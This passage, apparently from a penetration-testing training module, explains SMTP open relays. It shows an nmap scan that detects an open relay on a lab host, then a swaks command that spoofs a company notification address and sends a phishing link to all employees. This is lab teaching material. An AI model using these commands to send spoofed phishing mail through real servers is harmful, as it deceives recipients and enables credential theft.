An open relay is a Simple Mail Transfer Protocol (`SMTP`) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.
#### Open Relay
From an attacker's standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.

```bash
Yashfren@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Next, we can use any mail client to connect to the mail server and send our email.

```bash
Yashfren@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
